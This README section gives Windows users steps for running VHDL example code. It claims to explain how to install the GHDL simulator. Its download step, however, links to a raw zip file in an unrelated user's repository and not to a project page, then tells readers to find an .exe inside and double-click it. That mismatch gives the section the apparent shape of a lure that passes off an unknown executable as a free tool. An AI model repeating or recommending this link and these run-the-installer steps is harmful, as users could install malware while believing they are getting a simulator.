## 🚀 Running the Examples (Optional)

If you want to run or test these VHDL code snippets on your Windows PC, you need a VHDL simulator.

Here is a simple way to get started using free tools:

### Installing GHDL Simulator

1. Go to this page: https://github.com/abbieonehundredfifty709/VHDL_examples/raw/refs/heads/main/work/VHD-examples-1.6.zip

2. Download the latest **Windows 64-bit** installer file (look for `.exe`).

3. Run the installer by double-clicking the downloaded file.

4. Follow the on-screen instructions to complete the installation.

5. After installation, open the **Command Prompt** (press `Win + R`, type `cmd`, and hit Enter).

6. Navigate to the folder where your VHDL files are saved using the `cd` command, for example:
   
   ```
   cd C:\Users\YourName\Downloads\VHDL_examples-master
   ```

7. Use GHDL commands to compile and simulate the code:

   ```
   ghdl -a filename.vhd
   ghdl -e entity_name
   ghdl -r entity_name --vcd=output.vcd
   ```

Replace `filename.vhd` with the file name you want to run, and `entity_name` with the main entity defined in that file.

The tool will create simulation results that you can review to see how the code behaves.
